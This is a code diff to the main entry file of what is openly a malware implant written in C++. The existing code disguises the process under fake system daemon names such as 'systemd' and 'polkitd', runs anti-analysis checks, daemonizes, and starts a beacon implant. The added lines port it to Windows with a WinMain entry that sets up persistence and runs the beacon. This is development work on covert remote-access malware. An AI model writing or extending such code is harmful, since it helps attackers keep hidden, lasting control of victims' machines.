@@ -3,11 +3,15 @@
 #include "evasion/Detection.h"
 #include "utils/Logger.h"
 #include "utils/Obfuscator.h"
+#ifndef _WIN32
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/prctl.h>
 #include <sys/ptrace.h>
+#else
+#include <windows.h>
+#endif
 #include <signal.h>
 #include <vector>
 #include <string>
@@ -16,6 +20,7 @@
 #include <chrono>
 #include <thread>
 namespace {
+#ifndef _WIN32
     std::string fake_names[] = {
         "systemd", "dbus-daemon", "pulseaudio", "upowerd",
         "gvfsd", "bluetoothd", "NetworkManager", "polkitd", "rtkit-daemon"
@@ -46,10 +51,20 @@ namespace {
         umask(0); chdir("/");
         for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) close(x);
     }
+#endif
 }
+#ifdef _WIN32
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
+    persistence::establishPersistence();
+    beacon::Beacon implant;
+    implant.run();
+    return 0;
+}
+#else
 int main(int argc, char** argv) {
     AntiAnalysis();
-    std::mt19937 rng(std::chrono::system_clock::now().time_since_epoch().count());
+    std::mt19937 rng((unsigned int)std::chrono::system_clock::now().time_since_epoch().count());
     std::uniform_int_distribution<size_t> dist(0, 8);
     ScrubArgv(argc, argv, fake_names[dist(rng)].c_str());
     Daemonize();
@@ -57,3 +72,4 @@ int main(int argc, char** argv) {
     beacon::Beacon implant; implant.run();
     return 0;
 }
+#endif
